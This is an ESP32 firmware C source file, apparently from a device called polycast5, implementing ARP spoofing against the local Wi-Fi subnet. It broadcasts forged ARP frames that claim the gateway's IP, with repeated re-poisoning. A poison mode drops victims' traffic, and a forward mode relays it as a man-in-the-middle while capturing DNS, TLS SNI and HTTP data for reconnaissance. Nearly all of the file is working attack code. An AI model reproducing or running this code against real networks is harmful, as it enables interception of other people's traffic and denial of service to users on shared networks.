#include "polycast5_macros.h"

#include <string.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/event_groups.h"

#include "esp_log.h"
#include "esp_err.h"
#include "esp_attr.h" // EXT_RAM_BSS_ATTR (via POLYCAST5_USE_PSRAM_BSS)
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_netif_ip_addr.h"
#include "esp_netif.h" // esp_netif_tcpip_exec (resolve gateway MAC in the tcpip thread)
#include "esp_private/wifi.h" // esp_wifi_internal_tx

#include "lwip/pbuf.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include "lwip/etharp.h"
#include "lwip/prot/ip4.h"
#include "lwip/prot/ethernet.h"

#include "wifi_task.h"
#include "wifi_utils.h" 

#include "arp_spoof.h"
#include "mitm_capture.h"
#include "arp_spoof_lwip_hooks.h" // Prototype for arp_spoof_lwip_ip4_input_hook (checked against the definition below)

#define TAG "ARP_SPOOF"

#define ARP_OPER_REQUEST 1     // Gratuitous ARP request (widely accepted for cache updates)
#define ARP_OPER_REPLY 2       // Unsolicited ARP reply (some stacks prefer replies)
#define ARP_ETH_HDR_LEN 14     // dst(6) + src(6) + ethertype(2)
#define ARP_IP4_MIN_HDR 20     // Minimum bytes needed to read the IPv4 destination
#define ARP_REPOISON_MS 200    // Re-broadcast interval; must beat the victim's re-ARP recovery
#define ARP_RELAY_BUF_LEN 1600 // Ethernet header + max forwarded IP packet
#define ARP_RELAY_MAX_FWD_LEN 600 // L3 bytes: relay frames <= this (interactive); shed larger (bulk)
#define ARP_RELAY_SNAP_LEN 384 // Head bytes copied from a shed frame for the readout (mirrors CAP_SNAP_LEN)

#define TIMER_GET_TIME_SEC() ((uint32_t)(esp_timer_get_time() / 1000000ULL))

// Set in wifi_ping.c on IP_EVENT_STA_GOT_IP (see wifi_utils.c)
extern esp_ip4_addr_t sta_gw;
extern bool sta_gw_valid;

// Active mode; read by both the worker task and the lwIP input hook (tcpip thread)
static volatile arp_spoof_mode_t s_mode = ARP_MODE_OFF;

static TaskHandle_t s_arp_task_handle = NULL;

static uint8_t s_our_mac[6]; // Our STA MAC (the address we claim the gateway lives at)
static ip4_addr_t s_gw_ip; // Gateway IP we are impersonating (network byte order)

static uint8_t s_gw_mac[6]; // Real gateway MAC, learned from our own ARP cache
static volatile bool s_gw_mac_valid = false;

static volatile uint32_t s_pkts_handled = 0; // Redirected packets dropped or relayed
static volatile uint32_t s_tx_drops = 0; // Relay re-inject failures (Wi-Fi TX buffer starvation)

// Scratch for L2 relay; only ever touched from the tcpip thread (hook runs core-locked)
POLYCAST5_USE_PSRAM_BSS static uint8_t s_relay_buf[ARP_RELAY_BUF_LEN];

// Stable per-run copy of the target
static arp_spoof_target_t s_run_target;

/**
 * @brief Broadcast one forged ARP frame
 *
 * @param [in] oper    ARP opcode (request/reply)
 * @param [in] sha     Sender hardware address (the MAC we are claiming for spa)
 * @param [in] spa_be  Sender protocol (IPv4) address, network byte order
 * @param [in] tha     Target hardware address
 * @param [in] tpa_be  Target protocol (IPv4) address, network byte order
 *
 * @returns ESP_OK if the driver accepted the frame for transmission
 */
static esp_err_t arp_spoof_send_arp(uint16_t oper, const uint8_t sha[6], uint32_t spa_be, const uint8_t tha[6], uint32_t tpa_be)
{
    static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t f[60] = {0}; // 14 eth + 28 arp = 42; zero-padded to the 60-byte Ethernet minimum

    // Ethernet header
    memcpy(f + 0, bcast, 6);      // dst: broadcast
    memcpy(f + 6, s_our_mac, 6);  // src: our STA MAC (the radio transmits from our interface)
    f[12] = 0x08; f[13] = 0x06;   // EtherType: ARP

    // ARP payload
    f[14] = 0x00; f[15] = 0x01;   // HTYPE: Ethernet
    f[16] = 0x08; f[17] = 0x00;   // PTYPE: IPv4
    f[18] = 6;                    // HLEN
    f[19] = 4;                    // PLEN
    f[20] = (uint8_t)(oper >> 8); // OPER (hi)
    f[21] = (uint8_t)(oper);      // OPER (lo)
    memcpy(f + 22, sha, 6);       // Sender HW addr
    memcpy(f + 28, &spa_be, 4);   // Sender proto addr (network order)
    memcpy(f + 32, tha, 6);       // Target HW addr
    memcpy(f + 38, &tpa_be, 4);   // Target proto addr (network order)

    return esp_wifi_internal_tx(WIFI_IF_STA, f, sizeof(f));
}

/*
 * lwIP IPv4-input hook: called for EVERY inbound IPv4 packet (wired in via the CMake
 * ESP_IDF_LWIP_HOOK_FILENAME machinery). Return 0 to let lwIP process the packet as normal, or 1
 * to "eat" it (in which case we own the pbuf and must free it). High-level flow:
 *   - feature idle, or packet is really for us / broadcast / multicast  -> return 0 (normal path)
 *   - a packet the ARP poison redirected to us (transit traffic) -> we own it:
 *       FORWARD: rewrite the L2 header to the real next hop and re-inject (the MitM relay), and
 *                feed a copy to the serial readout; then eat it
 *       POISON : just drop it (deny)
 */
int arp_spoof_lwip_ip4_input_hook(struct pbuf *p, struct netif *inp)
{
    arp_spoof_mode_t mode = s_mode;

    // Idle (or malformed) -> leave the packet for normal lwIP processing
    if (mode == ARP_MODE_OFF || p == NULL || inp == NULL) {
        return 0;
    }

    // Need a contiguous IPv4 header in the first pbuf to read the destination
    if (p->len < ARP_IP4_MIN_HDR) {
        return 0;
    }

    const struct ip_hdr *iphdr = (const struct ip_hdr *)p->payload;

    ip4_addr_t dst;
    dst.addr = iphdr->dest.addr;

    // Traffic genuinely for us (or broadcast/multicast we should see) -> normal path
    if (dst.addr == netif_ip4_addr(inp)->addr ||
            ip4_addr_isbroadcast(&dst, inp) ||
            ip4_addr_ismulticast(&dst)) {
        return 0;
    }

    // Transit traffic redirected to us by the poison -> we own this packet now
    s_pkts_handled++;

    // Learn the real gateway MAC from our own (un-poisoned) ARP cache the first chance we get
    if (!s_gw_mac_valid) {
        struct eth_addr *gw_eth = NULL;
        const ip4_addr_t *gw_ip_unused = NULL;
        if (etharp_find_addr(inp, &s_gw_ip, &gw_eth, &gw_ip_unused) >= 0 && gw_eth != NULL) {
            memcpy(s_gw_mac, gw_eth->addr, 6);
            s_gw_mac_valid = true;
        }
    }

    if (mode == ARP_MODE_FORWARD) {
        // Pick the real next hop: on-subnet destinations (return traffic the gateway bounced back
        // to a victim, or victim<->victim) go straight to that host; everything else is internet-
        // bound and goes to the gateway. Resolving per-packet also survives a stale gateway entry.
        // Same-subnet test: XOR dst with our IP, mask to the network bits; 0 == same network
        bool on_subnet = ((dst.addr ^ netif_ip4_addr(inp)->addr) & netif_ip4_netmask(inp)->addr) == 0;
        const ip4_addr_t *next_ip = on_subnet ? &dst : &s_gw_ip; // Local host vs the gateway

        struct eth_addr *nh_eth = NULL;
        const ip4_addr_t *nh_ip_unused = NULL;
        if (etharp_find_addr(inp, next_ip, &nh_eth, &nh_ip_unused) >= 0 && nh_eth != NULL) {
            // L2 bridge: rebuild the Ethernet header aimed at the real next hop and re-inject.
            // Selective relay: a single STA can't carry whole-subnet throughput, so only forward
            // small/interactive frames (DNS, TLS ClientHello, HTTP requests, ACKs, control) and
            // shed anything approaching the MTU - bulk upstream (uploads, torrent/stream upstream,
            // big POSTs). Spending our scarce TX airtime on bulk just starves everyone's name
            // lookups and stalls the subnet. The MitM readout still runs on shed frames (we snapshot
            // their head below), so which-sites recon is unaffected by what we drop.
            uint16_t total = p->tot_len;
            if ((uint32_t)total + ARP_ETH_HDR_LEN <= sizeof(s_relay_buf)) {
                memcpy(s_relay_buf + 0, nh_eth->addr, 6); // dst: real next hop
                memcpy(s_relay_buf + 6, s_our_mac, 6);    // src: us (we transmit)
                s_relay_buf[12] = 0x08;                   // EtherType: IPv4
                s_relay_buf[13] = 0x00;

                // Copy the packet head first - contiguous, even if the RX pbuf is chained - so we
                // can classify it and feed the readout. Reading p->payload directly can miss the L4
                // payload byte when the first pbuf holds only the headers (why HTTPS wouldn't load).
                uint16_t head = (total > ARP_RELAY_SNAP_LEN) ? ARP_RELAY_SNAP_LEN : total;
                pbuf_copy_partial(p, s_relay_buf + ARP_ETH_HDR_LEN, head, 0);

                // Serial MitM readout (DNS/SNI/HTTP) - runs for shed frames too, so recon is intact
                mitm_capture_submit(false, s_relay_buf + ARP_ETH_HDR_LEN, head);

                // Always relay connection-establishing packets (DNS, TLS ClientHello - even a large
                // post-quantum one that fills the MTU - HTTP requests, and QUIC/HTTP-3 handshakes)
                // regardless of size so handshakes complete and pages load; otherwise forward only
                // small/interactive frames and shed bulk upstream (uploads, stream upstream, POSTs).
                if (mitm_capture_is_priority(false, s_relay_buf + ARP_ETH_HDR_LEN, head) ||
                        total <= ARP_RELAY_MAX_FWD_LEN) {
                    // Copy the rest of the frame (if any) before transmitting the whole thing
                    if (total > head) {
                        pbuf_copy_partial(p, s_relay_buf + ARP_ETH_HDR_LEN + head, total - head, head);
                    }
                    uint16_t txlen = (uint16_t)(total + ARP_ETH_HDR_LEN);
                    if (txlen < 60) { // Pad small frames (e.g. bare ACKs) to the Ethernet minimum
                        memset(s_relay_buf + txlen, 0, 60 - txlen);
                        txlen = 60;
                    }
                    int txerr = esp_wifi_internal_tx(WIFI_IF_STA, s_relay_buf, txlen);
                    if (txerr != ESP_OK) {
                        // NO_MEM == Wi-Fi TX buffers exhausted (starvation). After shedding bulk this
                        // should stay near zero; if it keeps climbing the interactive load alone is
                        // too much. Rate-limit the log so it doesn't add load to the relay path.
                        s_tx_drops++;
                        if ((s_tx_drops & 0x3F) == 1) {
                            // ESP_LOGW(TAG, "relay TX drop: %s (total %" PRIu32 ") - raise "
                            //         "CONFIG_ESP_WIFI_STATIC_TX_BUFFER_NUM if this keeps climbing",
                            //         esp_err_to_name(txerr), s_tx_drops);
                        }
                    }
                }
                // else: bulk frame captured for the readout but intentionally not relayed (shed)
            }
        } else if ((s_pkts_handled & 0x07) == 0) {
            // Next hop not in our ARP cache yet -> kick off resolution (throttled) so the relay
            // self-heals. This packet drops; the sender's retransmit gets through once resolved.
            etharp_request(inp, next_ip);
        }
    }
    // Poison-only (or forward before the next hop resolves): drop the redirected packet.

    pbuf_free(p);
    return 1; // Packet eaten; lwIP will not process it further
}

// Pins the real gateway MAC from our own ARP cache; runs on the tcpip thread. Defined below.
static esp_err_t arp_pin_gw_cb(void *ctx);

bool arp_spoof_is_running(void)
{
    return s_arp_task_handle != NULL;
}

static void arp_spoof_task(void *pvParameters)
{
    arp_spoof_target_t *target = (arp_spoof_target_t *)pvParameters;
    arp_spoof_stats_t stats = {0};
    static const uint8_t zero_mac[6] = {0};

    uint32_t arps_sent = 0;
    uint32_t start_time = TIMER_GET_TIME_SEC();

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "arp_spoof_task started: mode=%d, duration=%" PRIu32 "s",
            (int)target->mode, target->duration_sec);
#endif

    // Resolve + pin the real gateway MAC from our own ARP cache (kicking off resolution if it isn't
    // cached). Done here in the worker - NOT in arp_spoof_start - so it doesn't block the shared
    // wifi dispatcher task for the whole retry window. Best-effort: if it stays unresolved the hook
    // keeps trying, but stop/heal may be skipped. Bail early if the run was cancelled meanwhile.
    for (int i = 0; i < 12 && !s_gw_mac_valid; ++i) {
        esp_netif_tcpip_exec(arp_pin_gw_cb, NULL);
        if (s_gw_mac_valid) {
            break;
        }
        if (xEventGroupGetBits(xWifiEventGroup) & WIFI_STOP_ARP_SPOOF_BIT) {
            break; // Cancelled during resolve -> the stop check in the loop below exits us
        }
        vTaskDelay(pdMS_TO_TICKS(25));
    }
    if (!s_gw_mac_valid) {
        ESP_LOGW(TAG, "arp_spoof_task: gateway MAC unresolved; heal may be incomplete");
    }

    while (1) {
        uint32_t elapsed = TIMER_GET_TIME_SEC() - start_time;

        // Duration expired
        if (elapsed >= target->duration_sec) {
#ifdef POLYCAST5_DEBUG
            ESP_LOGI(TAG, "arp_spoof_task duration expired");
#endif
            break;
        }
        // Stop requested from the UI
        if (xEventGroupGetBits(xWifiEventGroup) & WIFI_STOP_ARP_SPOOF_BIT) {
            xEventGroupClearBits(xWifiEventGroup, WIFI_STOP_ARP_SPOOF_BIT);
            break;
        }
        // Wi-Fi dropped -> stop; don't leave the hook armed for a reconnect (maybe a different LAN)
        if (!(xEventGroupGetBits(xWifiEventGroup) & WIFI_CONNECTED_BIT)) {
            break;
        }

        // Tell the whole subnet "gateway IP is at our MAC". Send both a gratuitous request and
        // an unsolicited reply so we poison stacks that only honor one form. Count only the frames
        // the driver actually accepted.
        if (arp_spoof_send_arp(ARP_OPER_REQUEST, s_our_mac, s_gw_ip.addr, zero_mac, s_gw_ip.addr) == ESP_OK) {
            arps_sent++;
        }
        if (arp_spoof_send_arp(ARP_OPER_REPLY, s_our_mac, s_gw_ip.addr, zero_mac, s_gw_ip.addr) == ESP_OK) {
            arps_sent++;
        }

        // Push live stats
        stats.spoofing = true;
        stats.mode = s_mode;
        stats.arps_sent = arps_sent;
        stats.pkts_handled = s_pkts_handled;
        stats.tx_drops = s_tx_drops;
        stats.duration_sec = target->duration_sec;
        (void)xQueueOverwrite(xWifiArpSpoofStatsQueue, &stats);

        // Re-poison periodically (caches expire); comfortably WDT-safe
        vTaskDelay(pdMS_TO_TICKS(ARP_REPOISON_MS));
    }

    // Stop the hook from acting before we heal the network
    s_mode = ARP_MODE_OFF;

    // Heal: restore the real gateway mapping for everyone we poisoned
    if (s_gw_mac_valid) {
        for (int i = 0; i < 5; ++i) {
            arp_spoof_send_arp(ARP_OPER_REQUEST, s_gw_mac, s_gw_ip.addr, zero_mac, s_gw_ip.addr);
            arp_spoof_send_arp(ARP_OPER_REPLY, s_gw_mac, s_gw_ip.addr, zero_mac, s_gw_ip.addr);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }

    // Final stats so the UI clears its "spoofing" state
    stats.spoofing = false;
    stats.mode = ARP_MODE_OFF;
    stats.arps_sent = arps_sent;
    stats.pkts_handled = s_pkts_handled;
    stats.tx_drops = s_tx_drops;
    stats.duration_sec = target->duration_sec;
    // Overwrite this depth-1 mailbox so the final stopped state can't be dropped behind a stale live
    // stat (which would otherwise leave the UI stuck on RUNNING). Non-blocking; always the latest.
    (void)xQueueOverwrite(xWifiArpSpoofStatsQueue, &stats);

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "arp_spoof_task done: %" PRIu32 " ARPs sent, %" PRIu32 " pkts handled",
            arps_sent, s_pkts_handled);
#endif

    // Release the relay low-latency hold taken in arp_spoof_start (paired; refcounted)
    if (target->mode == ARP_MODE_FORWARD) {
        wifi_utils_relay_lowlatency(false);
    }

    s_arp_task_handle = NULL;
    vTaskDelete(NULL);
}

/*
 * Runs in the tcpip thread (via esp_netif_tcpip_exec, since core-locking is off): pin the real
 * gateway MAC from our own un-poisoned ARP cache, kicking off resolution if it isn't cached yet.
 * Returns ESP_OK once s_gw_mac is filled.
 */
static esp_err_t arp_pin_gw_cb(void *ctx)
{
    (void)ctx;
    struct netif *nif = netif_default; // The STA netif while connected
    if (nif == NULL) {
        return ESP_FAIL;
    }
    struct eth_addr *eth = NULL;
    const ip4_addr_t *ip_unused = NULL;
    if (etharp_find_addr(nif, &s_gw_ip, &eth, &ip_unused) >= 0 && eth != NULL) {
        memcpy(s_gw_mac, eth->addr, 6);
        s_gw_mac_valid = true;
        return ESP_OK;
    }
    etharp_request(nif, &s_gw_ip); // Not cached -> trigger an ARP request
    return ESP_FAIL;
}

esp_err_t arp_spoof_start(arp_spoof_target_t *target)
{
    if (s_arp_task_handle != NULL) {
        ESP_LOGW(TAG, "arp_spoof_start: already running");
        return ESP_ERR_INVALID_STATE;
    }
    if (!target) {
        ESP_LOGE(TAG, "arp_spoof_start: NULL target");
        return ESP_ERR_INVALID_ARG;
    }
    if (target->duration_sec == 0) {
        ESP_LOGE(TAG, "arp_spoof_start: duration_sec is zero");
        return ESP_ERR_INVALID_ARG;
    }
    if (target->mode != ARP_MODE_POISON && target->mode != ARP_MODE_FORWARD) {
        ESP_LOGE(TAG, "arp_spoof_start: invalid mode %d", (int)target->mode);
        return ESP_ERR_INVALID_ARG;
    }
    // ARP spoof needs to be on the LAN (associated with a valid gateway)
    if (!sta_gw_valid || !(xEventGroupGetBits(xWifiEventGroup) & WIFI_CONNECTED_BIT)) {
        ESP_LOGW(TAG, "arp_spoof_start: not connected to a network");
        return ESP_ERR_INVALID_STATE;
    }

    // Snapshot target params
    s_gw_ip.addr = sta_gw.addr;
    s_gw_mac_valid = false;
    memset(s_gw_mac, 0, sizeof(s_gw_mac));
    s_pkts_handled = 0;
    s_tx_drops = 0;

    // Take a stable copy the worker owns for its whole run (see s_run_target)
    s_run_target = *target;

    esp_err_t err = esp_wifi_get_mac(WIFI_IF_STA, s_our_mac);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "arp_spoof_start: esp_wifi_get_mac failed: %s", esp_err_to_name(err));
        return err;
    }

    // Enable the input hook, then start broadcasting
    s_mode = s_run_target.mode;

    // Take the low-latency hold BEFORE creating the worker: its paired release runs on the worker's
    // exit, and a worker that stops immediately (Back pressed right after start) could otherwise
    // release at refs==0 (a no-op) before we ever acquire - leaving the hold stuck on until reboot.
    // Undone below if task creation fails. (Forward relay needs the radio awake so victims' ACKs
    // aren't delayed by modem sleep, which otherwise throttles their downloads to a crawl.)
    if (s_run_target.mode == ARP_MODE_FORWARD) {
        wifi_utils_relay_lowlatency(true);
    }

    BaseType_t ret = xTaskCreate(arp_spoof_task, "arp_spoof", (1024 * 4), &s_run_target, POLYCAST5_PRIORITY_MEDIUM, &s_arp_task_handle);
    if (ret != pdPASS) {
        s_mode = ARP_MODE_OFF;
        s_arp_task_handle = NULL;
        if (s_run_target.mode == ARP_MODE_FORWARD) {
            wifi_utils_relay_lowlatency(false); // undo the hold taken above
        }
        ESP_LOGE(TAG, "arp_spoof_start: failed to create arp_spoof_task");
        return ESP_FAIL;
    }

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "arp_spoof_start: mode=%d, gateway=" IPSTR, (int)target->mode, IP2STR(&sta_gw));
#endif

    return ESP_OK;
}
